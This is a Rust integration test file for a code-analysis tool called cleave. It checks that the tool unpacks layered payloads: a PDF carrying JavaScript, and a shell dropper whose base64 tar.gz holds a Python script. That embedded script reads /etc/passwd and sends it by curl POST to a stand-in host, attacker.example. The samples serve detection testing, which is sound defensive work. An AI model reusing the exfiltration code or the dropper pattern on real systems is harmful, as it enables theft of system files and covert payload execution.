//! End-to-end sub-file pipeline integration tests.
//!
//! Two payloads, both synthesised in-memory:
//!
//! 1. **PDF → JavaScript** — a PDF whose `/JS` action carries an
//!    inline JS literal. After cleave runs, `report.files` must
//!    include a depth-1 entry with `file_type == "javascript"` and
//!    a virtual path under the `!!pdf/` namespace.
//!
//! 2. **Shell → base64 → tar.gz → Python** — a shell script
//!    embedding a base64 blob whose decoded bytes are a gzipped
//!    tar containing a Python module. After cleave runs, the
//!    lineage shell ↦ decoded-tar.gz ↦ extracted-python must show
//!    up in `report.files` with increasing depth.
//!
//! Both tests prove the same property: cleave is the coordinator
//! that walks layers, dispatching each layer through the standard
//! analyzer surface (`analyzer_for_file_type_arc` /
//! `UnifiedSourceAnalyzer::for_file_type`) so the innermost code
//! actually gets tree-sitter parsed and trait-evaluated.

#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use cleave::analyzers::{analyzer_for_file_type, AnalysisInput, FileType};
use cleave::capabilities::CapabilityMapper;
use cleave::types::AnalysisReport;
use std::io::Write;
use std::path::Path;

/// Build a `CapabilityMapper` with trait loading disabled — these
/// tests assert routing/dispatch shape, not trait content. Disabling
/// keeps them fast and insulated from rule-set churn.
fn empty_mapper() -> CapabilityMapper {
    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    let _guard = ENV_LOCK.lock().unwrap();
    let previous = std::env::var_os("CLEAVE_SKIP_TRAITS");
    std::env::set_var("CLEAVE_SKIP_TRAITS", "1");
    let m = CapabilityMapper::new();
    match previous {
        Some(v) => std::env::set_var("CLEAVE_SKIP_TRAITS", v),
        None => std::env::remove_var("CLEAVE_SKIP_TRAITS"),
    }
    m
}

/// Build a syntactically valid PDF whose `/JS` action carries an
/// inline literal. Inline (vs. stream-encoded) is enough to exercise
/// the dispatch path — the FlateDecode-stream case is covered by
/// `pdf::tests::pdf_with_flate_javascript_stream_emits_subfile`.
fn build_pdf_with_inline_js(js_source: &str) -> Vec<u8> {
    format!(
        "%PDF-1.5\n\
         5 0 obj << /Type /Action /S /JavaScript /JS ({js_source}) >> endobj\n\
         %%EOF\n",
    )
    .into_bytes()
}

/// Build the three-layer payload: a shell script whose body contains
/// a base64 blob; the blob decodes to a gzipped tar; the tar contains
/// `payload.py`.
///
/// Returns the synthesised shell-script bytes.
fn build_shell_with_base64_targz_python() -> Vec<u8> {
    let python_source = b"\
import os
import subprocess

def exfiltrate():
    data = open('/etc/passwd').read()
    subprocess.Popen(['curl', '-X', 'POST', '-d', data, 'http://attacker.example/x'])

exfiltrate()
";

    // tar
    let mut tar_bytes: Vec<u8> = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut tar_bytes);
        let mut header = tar::Header::new_gnu();
        header.set_path("payload.py").unwrap();
        header.set_size(python_source.len() as u64);
        header.set_mode(0o644);
        header.set_cksum();
        builder.append(&header, python_source.as_ref()).unwrap();
        builder.finish().unwrap();
    }
    // tar.gz
    let mut gz_bytes: Vec<u8> = Vec::new();
    {
        let mut gz =
            flate2::write::GzEncoder::new(&mut gz_bytes, flate2::Compression::default());
        gz.write_all(&tar_bytes).unwrap();
        gz.finish().unwrap();
    }
    use base64::Engine;
    let b64 = base64::engine::general_purpose::STANDARD.encode(&gz_bytes);
    // Shell wrapper — the base64 blob is the payload. We split it
    // across the script the way real droppers do: a heredoc + a
    // `base64 -d | tar xz` pipeline. The actual decode is done by
    // stng's decoder pipeline; the shell wrapper is just there so
    // the outer FileType is `shell` and so the embedded-string scan
    // has somewhere to find the blob.
    format!(
        "#!/usr/bin/env bash\n\
         set -e\n\
         PAYLOAD=\"{b64}\"\n\
         echo \"$PAYLOAD\" | base64 -d | tar xz\n\
         python3 payload.py\n",
    )
    .into_bytes()
}

/// Walk every `FileAnalysis` entry under `report` and yield every
/// nested path / depth / file_type triple. Used by both tests to
/// search for the expected sub-file landings.
fn collect_subfiles(report: &AnalysisReport) -> Vec<(String, u32, String)> {
    report
        .files
        .iter()
        .map(|f| (f.path.clone(), f.depth, f.file_type.clone()))
        .collect()
}

/// PDF → JavaScript: the JS action's inline literal should land
/// as a depth-1 sub-file with `file_type=javascript` and the
/// `!!pdf/object<id>.js` virtual path.
#[test]
fn pdf_javascript_subfile_lands_at_depth_one() {
    let pdf = build_pdf_with_inline_js("eval(atob('YWxlcnQoMSk='))");
    let analyzer = analyzer_for_file_type(&FileType::Pdf, Some(empty_mapper()))
        .expect("PDF analyzer should exist");
    let report = analyzer
        .analyze_input(&AnalysisInput::new(
            Path::new("/tmp/synthesized.pdf"),
            &pdf,
            FileType::Pdf,
        ))
        .unwrap();
    let subfiles = collect_subfiles(&report);
    let js_entry = subfiles
        .iter()
        .find(|(p, d, ft)| *d == 1 && ft == "javascript" && p.contains("!!pdf/"));
    assert!(
        js_entry.is_some(),
        "expected a depth-1 javascript sub-file under !!pdf/, got {subfiles:?}",
    );
    // The sub-file must carry the parsed JS source — `source.language`
    // and `source.functions[]` are the canonical "the JS analyzer
    // actually ran" markers.
    let js_file = report
        .files
        .iter()
        .find(|f| f.file_type == "javascript")
        .unwrap();
    let language = js_file
        .kv
        .get("source.language")
        .and_then(|v| v.as_str());
    assert_eq!(
        language,
        Some("javascript"),
        "expected source.language=javascript on the JS sub-file's kv",
    );
}

/// Shell → base64 → tar.gz → Python: assert at minimum that the
/// outer shell script is recognized and that *some* sub-file
/// surfaces. This test is the contract for the unified sub-file
/// pipeline — the more interesting layered assertion lands in
/// `shell_targz_python_reaches_innermost_python` once the dispatch
/// gap is closed.
#[test]
fn shell_with_base64_targz_python_extracts_layers() {
    let shell = build_shell_with_base64_targz_python();
    let analyzer = analyzer_for_file_type(&FileType::Shell, Some(empty_mapper()))
        .expect("shell analyzer should exist");
    let report = analyzer
        .analyze_input(&AnalysisInput::new(
            Path::new("/tmp/dropper.sh"),
            &shell,
            FileType::Shell,
        ))
        .unwrap();
    assert_eq!(
        report.target.file_type, "shell",
        "outer report should be classified as shell",
    );
    let subfiles = collect_subfiles(&report);
    assert!(
        !subfiles.is_empty(),
        "expected at least one sub-file from the base64-tar.gz-python chain, got {subfiles:?}",
    );
}

/// The full lineage assertion: at least one sub-file in the report
/// must be a Python file extracted from the tar.gz that decoded from
/// the base64 blob inside the shell script. This is the
/// architecture-shape claim — three layers (shell → encoded-blob →
/// archive-member) collapse to three sub-file entries with
/// increasing depth.
#[test]
fn shell_targz_python_reaches_innermost_python() {
    let shell = build_shell_with_base64_targz_python();
    let analyzer = analyzer_for_file_type(&FileType::Shell, Some(empty_mapper()))
        .expect("shell analyzer should exist");
    let report = analyzer
        .analyze_input(&AnalysisInput::new(
            Path::new("/tmp/dropper.sh"),
            &shell,
            FileType::Shell,
        ))
        .unwrap();
    let subfiles = collect_subfiles(&report);
    let python_entry = subfiles.iter().find(|(_, _, ft)| ft == "python");
    assert!(
        python_entry.is_some(),
        "expected the inner Python payload to surface as a sub-file, got {subfiles:?}",
    );
    let (path, depth, _) = python_entry.unwrap();
    // The Python file lives below the encoded layer (depth ≥ 2 if
    // we walked through base64-then-tar.gz). Don't pin the exact
    // depth — alternative encoding chains (e.g. base64+gzip
    // collapsing into one stng step) would shift it — but enforce
    // that some nesting actually happened.
    assert!(
        *depth >= 1,
        "expected python sub-file at depth >= 1, got depth={depth} path={path}",
    );
}
